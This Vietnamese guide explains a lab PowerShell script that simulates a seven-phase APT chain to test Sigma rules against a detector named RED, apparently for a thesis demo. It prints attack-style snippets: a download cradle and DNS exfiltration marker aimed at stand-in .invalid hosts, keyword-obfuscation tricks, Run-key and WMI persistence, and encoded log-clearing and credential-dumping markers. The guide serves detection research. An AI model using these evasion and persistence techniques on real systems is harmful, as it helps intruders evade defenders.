# Giải thích `apt_demo_scenario.ps1`

File này giải thích bản hiện tại của `demo/apt_demo_scenario.ps1` để dùng khi
chuẩn bị demo RED + AI Agent. Nội dung tập trung vào:

- Script nhận tham số gì.
- `chain` khác `evasion` như thế nào.
- Mỗi phase sinh log gì.
- Sigma dự kiến bắt phần nào.
- RED dự kiến bắt/attribute phần nào.
- Cách verify nhanh trên Elasticsearch/Kibana.

> Cập nhật theo script hiện tại: `apt_demo_scenario.ps1` có 7 phase, hỗ trợ
> `benign | baseline | evasion | chain`, mặc định là `chain`.

---

## 1. Cách Chạy Đúng

Trên Windows VM:

```powershell
powershell -ExecutionPolicy Bypass -File C:\Users\LuanThanh\apt_demo_scenario.ps1 -Mode chain -SleepSeconds 120
```

Chạy thử parse/script flow, không thực thi action:

```powershell
powershell -ExecutionPolicy Bypass -File C:\Users\LuanThanh\apt_demo_scenario.ps1 -Mode chain -DryRun
```

Chạy riêng một phase:

```powershell
powershell -ExecutionPolicy Bypass -File C:\Users\LuanThanh\apt_demo_scenario.ps1 -Mode evasion -Phase 1 -SleepSeconds 120
```

Lưu ý quan trọng:

- Không thêm dấu `'` ở cuối lệnh.
- `-SleepSeconds` giữ process PowerShell sống đủ lâu để RED/Forensic nhìn thấy.
- Script tự tạo `RunId`; khi demo nhớ copy `RunId` để search trong Kibana.
- Nếu chạy qua SSH, có thể phát sinh thêm alert liên quan SSH/non-interactive parent. Đây là nhiễu lab, không phải lỗi RED.

---

## 2. Mode Hoạt Động

| Mode | Mục đích | Kỳ vọng Sigma | Kỳ vọng RED |
|---|---|---|---|
| `benign` | Đối chứng hành vi quản trị bình thường | Không có alert mới | Không có RED alert đáng kể |
| `baseline` | Chạy pattern canonical/literal | Sigma rule cứng fire rõ | RED score cao, attribution gần rule Sigma |
| `evasion` | Chạy biến thể né keyword/literal | Một số rule cứng có thể miss; rule behavior rộng vẫn có thể fire | RED bắt obfuscation/near-miss |
| `chain` | Kịch bản APT thực tế hơn, pha baseline + advanced behavior | Sigma fire phần baseline/behavior, có thể miss phần evasion | RED bắt cả baseline lẫn phần né |

Nói ngắn gọn khi thuyết trình:

- `baseline`: “đây là mẫu dễ bắt vì có keyword/rule literal”.
- `evasion`: “đây là cùng ý đồ nhưng đổi cách viết để tránh rule cứng”.
- `chain`: “đây là câu chuyện tấn công hoàn chỉnh hơn, có cả phần Sigma bắt được và phần RED bổ sung”.

---

## 3. Khác Nhau Giữa `chain` Và `evasion`

| Phase | `chain` hiện tại | `evasion` hiện tại |
|---|---|---|
| Phase 1 - Execution | `powershell -EncodedCommand <base64>` baseline | `powershell -e <base64>` + format string + char-code `IEX` |
| Phase 2 - Download cradle | Literal `IEX (New-Object System.Net.WebClient).DownloadString(...)` | Split string, comment injection, env-var chain |
| Phase 3 - Persistence | `HKCU\...\Run` + WMI Event Subscription | `HKCU\...\RunOnce` + WMI Event Subscription |
| Phase 4 - Defense evasion | Child scriptblock có literal log-cleanup cmdlet dựng runtime | Char-code hash, base64 memory marker, reverse string |
| Phase 5 - Credential marker | Child scriptblock có credential marker dựng runtime | Char-code hash, base64 marker, reverse string |
| Phase 6 - DNS/Fileless/LOLBins | DNS tunneling + fileless marker; LOLBins chỉ chạy nếu bật noisy path | Giống phase 6 của chain |
| Phase 7 - Sandbox probe | Sandbox probe label baseline | Cùng probe, label evasion |

Vì vậy, `chain` không phải “evasion thuần”. Nó là kịch bản tổng hợp để demo cả 3 lớp:

1. Sigma bắt phần rõ ràng.
2. RED bắt phần gần giống/né rule.
3. AI Agent điều tra theo chuỗi sự kiện.

---

## 4. Ghi Chú Kỹ Thuật Cần Biết Trước Demo

Trong script hiện tại có hai điểm cần để ý:

1. Phase 6 gọi `Use-NoisySigma`, nhưng trong file hiện tại chưa thấy định nghĩa function/param này.
   Nếu chưa sửa script, PowerShell có thể in lỗi ở Phase 6 rồi tiếp tục chạy. Để demo sạch, nên thêm helper hoặc bỏ nhánh noisy.

2. Phần summary dùng `$IncludeNoisySigma`, nhưng tham số này cũng chưa được khai báo trong `param(...)`.
   Biến null thường được hiểu là false, nên summary sẽ đi vào nhánh “Sigma-low evasion”.

Nếu mục tiêu là chạy demo mượt trước hội đồng, nên sửa hai điểm này trong `.ps1`
hoặc chấp nhận rằng Phase 6 có thể hiện lỗi nhỏ trên console.

---

## 5. Bảng Phase Tổng Quan

| Phase | Chủ đề | Log chính | Sigma target | RED config/index |
|---|---|---|---|---|
| 1 | PowerShell encoded execution | Sysmon EID 1, PowerShell 4104 | EncodedCommand / suspicious invocation | `config/process_creation.yaml`, `config/powershell.yaml` |
| 2 | Download cradle | PowerShell 4104 | WebClient + DownloadString | `config/powershell.yaml` |
| 3 | Persistence | Sysmon EID 11, 12, 13, 19, 20, 21 | Run/RunOnce, WMI subscription | `config/registry_event.yaml`, process rules |
| 4 | Defense evasion marker | PowerShell 4104 | Clear log / memory marker | `config/powershell.yaml` |
| 5 | Credential access marker | PowerShell 4104 | credential keyword marker | `config/powershell.yaml` |
| 6 | DNS tunneling + fileless + optional LOLBins | Sysmon EID 22, PowerShell 4104, optional Sysmon EID 1 | DNS, reflection, LOLBins | `config/process_creation.yaml`, `config/powershell.yaml` |
| 7 | Sandbox/analysis probe | PowerShell 4104 | Get-CimInstance, Get-Process, analyst tools | `config/powershell.yaml` |

---

## 6. Phase 1 - PowerShell Encoded Execution

### Code chính

`chain` / `baseline`:

```powershell
Start-Process powershell.exe -ArgumentList "-NoProfile","-EncodedCommand",$enc
```

`evasion`:

```powershell
Start-Process powershell.exe -ArgumentList "-NoProfile","-e",$enc
$cmd = ('{0}{1}{2}' -f 'In','voke-Exp','ression')
$cmd = -join ([char]73,[char]69,[char]88)
```

### Ý nghĩa

- `-EncodedCommand` là literal phổ biến, Sigma dễ bắt.
- `-e` là shorthand hợp lệ của PowerShell, giúp né rule chỉ match literal `-EncodedCommand`.
- Format string và char-code tạo marker tương đương `Invoke-Expression`/`IEX` nhưng tránh literal trực tiếp.

### Log

- Sysmon EID 1: command line của `powershell.exe`.
- PowerShell EID 4104: scriptblock của variant format/char-code.

### Verify nhanh

```bash
curl -sk -u elastic:$ES_PASS "http://10.10.20.100:9200/logs-winlog*/_search?size=5" \
  -H 'Content-Type: application/json' \
  -d '{"query":{"query_string":{"query":"*RED_APT_DEMO_PHASE1*"}},"_source":["@timestamp","event.code","winlog.event_data.CommandLine","winlog.event_data.ScriptBlockText"]}'
```

---

## 7. Phase 2 - Download Cradle

### Code chính

`chain` / `baseline`:

```powershell
IEX (New-Object System.Net.WebClient).DownloadString('http://red-demo-cradle.invalid/...')
```

`evasion`:

```powershell
$type = ('Sys' + 'tem.Net.WebCl' + 'ient')
$method = ('.Down' + 'loadStr' + 'ing')
$wc = New-Object Sys<#a#>tem.Net.WebCl<#b#>ient
$assembled = $env:DEMO_T1 + $env:DEMO_T2
$wc = New-Object -TypeName $assembled
```

### Ý nghĩa

- Baseline có đủ literal `System.Net.WebClient` và `DownloadString`.
- Evasion chia nhỏ chuỗi, chèn comment hoặc dựng từ env var để né exact-match.
- Script lab-safe: không tải payload thật.

### Log

- PowerShell EID 4104 chứa ScriptBlockText.

### Verify nhanh

```bash
curl -sk -u elastic:$ES_PASS "http://10.10.20.100:9200/logs-winlog*/_search?size=5" \
  -H 'Content-Type: application/json' \
  -d '{"query":{"query_string":{"query":"*RED_APT_DEMO_PHASE2*"}},"_source":["@timestamp","event.code","winlog.event_data.ScriptBlockText"]}'
```

---

## 8. Phase 3 - Persistence

### Code chính

`chain` / `baseline`:

```powershell
Copy-Item C:\Windows\System32\calc.exe C:\Users\Public\xkj9_demo_<RunId>.exe
New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
  -Name "RED_APT_DEMO_PERSIST_<RunId>" -Value $DropperPath
```

`chain` thêm WMI Event Subscription:

```powershell
Set-WmiInstance -Namespace root\subscription -Class __EventFilter ...
Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer ...
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding ...
```

`evasion`:

```powershell
New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" `
  -Name "RED_APT_DEMO_PERSIST_<RunId>" -Value $DropperPath
```

và cũng tạo WMI Event Subscription.

### Ý nghĩa

- `Run` là persistence canonical.
- `RunOnce` là biến thể khác đường registry, có thể né rule chỉ match `Run`.
- WMI Event Subscription là behavior-level persistence, thường bị bắt bởi rule Sysmon WMI.

### Log

- Sysmon EID 11: file copy `xkj9_demo_<RunId>.exe`.
- Sysmon EID 13: registry SetValue.
- Sysmon EID 19/20/21: WMI filter/consumer/binding nếu WMI logging bật.

### Verify nhanh

```bash
curl -sk -u elastic:$ES_PASS "http://10.10.20.100:9200/logs-winlog*/_search?size=10" \
  -H 'Content-Type: application/json' \
  -d '{"query":{"query_string":{"query":"*RED_APT_DEMO_PERSIST* OR *xkj9_demo*"}},"_source":["@timestamp","event.code","winlog.event_data.TargetObject","winlog.event_data.Details","winlog.event_data.CommandLine"]}'
```

---

## 9. Phase 4 - Defense Evasion Marker

### Code hiện tại

`chain` / `baseline`:

```powershell
$cmdBytes = @(71,101,116,45,67,111,109,109,97,110,100,32,67,108,101,97,114,45,69,118,101,110,116,76,111,103,32,124,32,79,117,116,45,78,117,108,108)
$sensitive = -join ($cmdBytes | ForEach-Object { [char]$_ })
$scriptText = "Write-Host '...'; $sensitive"
```

Tức là child scriptblock chứa câu tương đương:

```powershell
Get-Command Clear-EventLog | Out-Null
```

`evasion`:

```powershell
# Variant A: char-code array rồi chỉ in hash
# Variant B: memory marker được build thành base64 rồi decode runtime, không eval
# Variant C: reverse string "goLtnevE-raelC"
```

### Ý nghĩa

- Bản cũ của tài liệu nói Phase 4 dùng split keyword/AMSI marker trực tiếp. Script hiện tại đã đổi: baseline cũng dựng literal qua char-code để parent script sạch, còn evasion chỉ log hash/length, không gọi destructive action.
- Đây là phase demo “keyword evasion”: cùng semantic marker nhưng tránh literal trong log parent/child.

### Log

- PowerShell EID 4104.

### Verify nhanh

```bash
curl -sk -u elastic:$ES_PASS "http://10.10.20.100:9200/logs-winlog*/_search?size=5" \
  -H 'Content-Type: application/json' \
  -d '{"query":{"query_string":{"query":"*RED_APT_DEMO_PHASE4*"}},"_source":["@timestamp","event.code","winlog.event_data.ScriptBlockText"]}'
```

---

## 10. Phase 5 - Credential Access Marker

### Code hiện tại

`chain` / `baseline`:

```powershell
$credBytes = @(115,101,107,117,114,108,115,97,58,58,108,111,103,111,110,112,97,115,115,119,111,114,100,115)
$sensitive = -join ($credBytes | ForEach-Object { [char]$_ })
$marker = $sensitive
```

`evasion`:

```powershell
# Variant A: char-code array rồi chỉ in hash
# Variant B: base64-encoded marker, decode runtime, chỉ in length
# Variant C: reverse string "sdrowssapnogol::aslrukes"
```

### Ý nghĩa

- Script không touch LSASS.
- Baseline tạo credential marker ở child scriptblock để Sigma keyword rule có dữ liệu.
- Evasion tránh literal `sekurlsa`/`logonpasswords` trong source bằng số, base64 hoặc chuỗi đảo.

### Log

- PowerShell EID 4104.

### Verify nhanh

```bash
curl -sk -u elastic:$ES_PASS "http://10.10.20.100:9200/logs-winlog*/_search?size=5" \
  -H 'Content-Type: application/json' \
  -d '{"query":{"query_string":{"query":"*RED_APT_DEMO_PHASE5*"}},"_source":["@timestamp","event.code","winlog.event_data.ScriptBlockText"]}'
```

---

## 11. Phase 6 - DNS Tunnel, Fileless, Optional LOLBins

### Code hiện tại

Phase này chạy cho `baseline`, `chain`, `evasion`.

Nhánh LOLBins:

```powershell
if (Use-NoisySigma) {
    Start-Process mshta.exe ...
    Start-Process regsvr32.exe ...
    Start-Process rundll32.exe ...
} else {
    Write-Action "Skip mshta/regsvr32/rundll32 in default evasion"
}
```

DNS tunneling marker luôn chạy:

```powershell
Resolve-DnsName -Name "<base64>.exfil.red-evasion.invalid"
```

Fileless marker luôn chạy:

```powershell
$markerKw = '[' + 'System.Reflection.Assembly' + ']::' + 'Load'
```

### Ý nghĩa

- DNS subdomain dài mô phỏng exfil/tunneling marker.
- Fileless marker mô phỏng `Reflection.Assembly::Load`, nhưng không load DLL thật.
- LOLBins là noisy path vì Sigma/Defender thường bắt mạnh `mshta`, `regsvr32`, `rundll32`.

### Cảnh báo

Script hiện tại chưa khai báo `Use-NoisySigma`. Nếu chưa sửa, Phase 6 có thể hiện lỗi khi vào `if (Use-NoisySigma)`.

### Log

- Sysmon EID 22: DNS query.
- PowerShell EID 4104: fileless marker.
- Sysmon EID 1: chỉ có nếu noisy LOLBins thật sự được bật/chạy.

### Verify nhanh

```bash
curl -sk -u elastic:$ES_PASS "http://10.10.20.100:9200/logs-winlog*/_search?size=5" \
  -H 'Content-Type: application/json' \
  -d '{"query":{"query_string":{"query":"*exfil.red-evasion.invalid* OR *RED_APT_DEMO_PHASE6*"}},"_source":["@timestamp","event.code","winlog.event_data.QueryName","winlog.event_data.CommandLine","winlog.event_data.ScriptBlockText"]}'
```

---

## 12. Phase 7 - Sandbox/Analysis Probe

### Code hiện tại

Phase này gần như giống nhau cho `baseline`, `chain`, `evasion`; khác chủ yếu ở label in ra console.

```powershell
$ram = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 1)
$procCount = (Get-Process).Count
$analysts = @('wireshark','procmon','procexp','x64dbg','ollydbg','ida','ghidra','fiddler')
Add-Type -AssemblyName System.Windows.Forms
$pos1 = [System.Windows.Forms.Cursor]::Position
$uptime = (Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
```

### Ý nghĩa

- Đây là sandbox/analysis evasion marker, nhưng lab-safe.
- Script chỉ probe và log, không thay đổi behavior dựa trên kết quả.

### Log

- PowerShell EID 4104.

### Verify nhanh

```bash
curl -sk -u elastic:$ES_PASS "http://10.10.20.100:9200/logs-winlog*/_search?size=5" \
  -H 'Content-Type: application/json' \
  -d '{"query":{"query_string":{"query":"*PHASE7_SANDBOX*"}},"_source":["@timestamp","event.code","winlog.event_data.ScriptBlockText"]}'
```

---

## 13. RED Live Detection Khuyến Nghị

Trước khi chạy Windows script, bật 3 luồng RED live detection trên Ubuntu lab.

```bash
cd ~/KLTN/KLTN/Rule_Evasion_Detection/rule_evasion_detection
source ~/venvs/rule_evasion_env/bin/activate
set -a; source .env; set +a
ES_AUTH_HOST="http://${ES_USER}:${ES_PASSWORD}@10.10.20.100:9200"
```

Process creation:

```bash
python3 scripts/detect_live.py \
  --config config/process_creation.yaml \
  --es-host "$ES_AUTH_HOST" \
  --es-index "logs-winlog*" \
  --out-index red-alerts-demo \
  --event-id 1 \
  --threshold 0.5 \
  --method cosine \
  --timestamp-field event.ingested \
  --interval 30 \
  --lookback 10m \
  --reset-state \
  --batch-size 500
```

Registry:

```bash
python3 scripts/detect_live.py \
  --config config/registry_event.yaml \
  --es-host "$ES_AUTH_HOST" \
  --es-index "logs-winlog*" \
  --out-index red-alerts-registry-demo \
  --event-id 13 \
  --threshold 0.5 \
  --method cosine \
  --timestamp-field event.ingested \
  --interval 30 \
  --lookback 10m \
  --reset-state \
  --batch-size 500
```

PowerShell ScriptBlock:

```bash
python3 scripts/detect_live.py \
  --config config/powershell.yaml \
  --es-host "$ES_AUTH_HOST" \
  --es-index "logs-winlog*" \
  --out-index red-alerts-powershell-demo \
  --event-id 4104 \
  --threshold 0.5 \
  --method cosine \
  --timestamp-field event.ingested \
  --interval 30 \
  --lookback 10m \
  --reset-state \
  --batch-size 500
```

Nếu script Windows đã chạy trước khi bật RED, backfill bằng `--since 20m --until now --max-iter 1 --no-state`.

---

## 14. Verify End-To-End Theo RunId

Sau khi chạy script, lấy `RunId` từ console Windows rồi set:

```bash
RUNID="<paste-runid>"
```

Đếm log gốc theo Event ID:

```bash
curl -sk -u elastic:$ES_PASS "http://10.10.20.100:9200/logs-winlog*/_search?size=0" \
  -H 'Content-Type: application/json' \
  -d "{\"query\":{\"query_string\":{\"query\":\"*${RUNID}*\"}},\"aggs\":{\"by_code\":{\"terms\":{\"field\":\"event.code\",\"size\":20}}}}"
```

Xem RED alerts mới:

```bash
curl -sk -u elastic:$ES_PASS \
  "http://10.10.20.100:9200/red-alerts-demo,red-alerts-registry-demo,red-alerts-powershell-demo/_search?size=20&sort=@timestamp:desc&ignore_unavailable=true" \
  | jq -r '.hits.hits[] | [._index, ._source["@timestamp"], ._source["red.detection_score"], ._source["red.top_rule"], (._source["red.command_line"] // "")] | @tsv'
```

Chạy batch detection nếu cần kiểm lại offline:

```bash
python3 scripts/elk_export.py \
  --es-host http://10.10.20.100:9200 \
  --es-user elastic \
  --es-password "$ES_PASS" \
  --es-index "logs-winlog*" \
  --event-id 4104 \
  --since 20m \
  --out /tmp/ps_4104.jsonl

python3 scripts/detect_batch.py \
  --config config/powershell.yaml \
  --events /tmp/ps_4104.jsonl \
  --threshold 0.5 \
  --method cosine \
  --out /tmp/red_ps_alerts.jsonl

jq -r 'select((.command_line // "") | test("RED_APT_DEMO")) | "\(.detection_score) | \(.top_rule) | \(.top_rule_sigma_filename)"' /tmp/red_ps_alerts.jsonl
```

---

## 15. Kỳ Vọng Khi Thuyết Trình

### Nếu chạy `-Mode chain`

Nói:

> Mode chain là kịch bản APT tổng hợp. Một số bước dùng pattern canonical để
> Sigma bắt được, một số bước có kỹ thuật né literal. Điểm cần chứng minh là
> RED không thay Sigma, mà bổ sung lớp phát hiện cho các biến thể gần giống rule.

Kỳ vọng:

- Kibana Security Alerts có một số alert Sigma.
- `red-alerts-*` có alert RED từ process/registry/powershell.
- AI Agent có thể lấy RED alert để viết report tiếng Việt.

### Nếu chạy `-Mode evasion`

Nói:

> Mode evasion giữ cùng ý đồ tấn công nhưng đổi cách biểu diễn keyword: shorthand,
> split string, comment injection, char-code, base64, reverse string. Đây là ca
> rule exact-match dễ miss, nhưng RED vẫn chấm suspicious nhờ vector hóa token và
> cosine attribution.

Kỳ vọng:

- Một số Sigma literal rule có thể không fire.
- Một số Sigma behavior rule vẫn có thể fire, nhất là WMI/DNS/PowerShell broad rules.
- RED vẫn có alert và top rule gợi ý rule Sigma gần nhất.

---

## 16. Cleanup

Script tự tạo cleanup job sau:

```text
SleepSeconds + 60 giây
```

Cleanup gồm:

- Xóa `C:\Users\Public\xkj9_demo_<RunId>.exe`.
- Xóa marker `mshta_marker_<RunId>.txt` nếu có.
- Xóa registry Run/RunOnce có prefix `RED_APT_DEMO`.
- Xóa WMI EventFilter, CommandLineEventConsumer và binding theo RunId.

Nếu cần cleanup thủ công, dùng script cleanup riêng trong tài liệu demo present hoặc xóa theo marker `RED_APT_DEMO`.

---

## 17. Tài Liệu Liên Quan

| File | Nội dung |
|---|---|
| `demo/apt_demo_scenario.ps1` | Script PowerShell chạy demo |
| `demo/apt_demo_scenario_demo_present.md` | Checklist và lời thoại demo trước hội đồng |
| `demo/README.md` | Hướng dẫn demo RED-AI SOC tổng thể |
| `demo/RED_RULE_MAP.md` | Mapping RED rule với Sigma metadata |
| `demo/QA_PREP.md` | Bộ câu hỏi có thể gặp khi bảo vệ |
| `demo/SLIDES_OUTLINE.md` | Outline slide |
